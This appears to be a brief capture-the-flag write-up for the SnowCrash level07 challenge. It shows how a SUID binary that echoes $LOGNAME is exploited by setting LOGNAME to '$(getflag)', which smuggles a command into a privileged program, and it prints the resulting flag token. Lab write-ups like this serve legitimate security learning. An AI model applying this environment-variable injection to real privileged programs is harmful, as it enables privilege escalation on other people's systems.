ls -la

another SUID script

level07@SnowCrash:~$ ./level07 
 level07
level07@SnowCrash:~$ ./level07 test
 level07

that echoes the same thing

strings level07

but this time it's not hardcoded
"LOGNAME" was though, just above the echo call
since the script seems to print the $LOGNAME env variable, let's try to change it :

export LOGNAME="GOD"
./level07 
 GOD

it does print $LOGNAME

export LOGNAME="\$(getflag)"
./level07 
 Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
